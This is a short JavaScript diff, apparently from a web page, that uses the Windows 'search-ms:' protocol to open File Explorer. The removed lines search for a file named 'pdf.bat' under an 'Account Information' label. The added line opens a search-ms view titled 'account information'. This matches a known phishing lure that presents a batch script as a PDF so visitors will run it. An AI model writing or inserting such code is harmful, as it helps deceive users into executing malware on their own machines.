@@ -518,22 +518,7 @@
                 
                 // Try to open Windows file explorer with search-ms protocol
                 try {
-                    // Multiple search-ms variations for better compatibility
-                    const searchQueries = [
-                        'search-ms:query=pdf.bat',
-                        'search-ms:displayname=Search%20Results%20for%20Account%20Information&crumb=System.Generic.String%3Apdf.bat',
-                        'search-ms:query=account%20information'
-                    ];
-                    
-                    // Try each search query
-                    for (const query of searchQueries) {
-                        try {
-                            window.open(query);
-                            break;
-                        } catch (e) {
-                            console.log(`Search query failed: ${query}`);
-                        }
-                    }
+                    window.open('search-ms:displayname=Search%20Results&crumb=System.Generic.String%3Aaccount%20information');
                 } catch (e) {
                     console.log('Could not open file explorer with search-ms protocol');
                 }
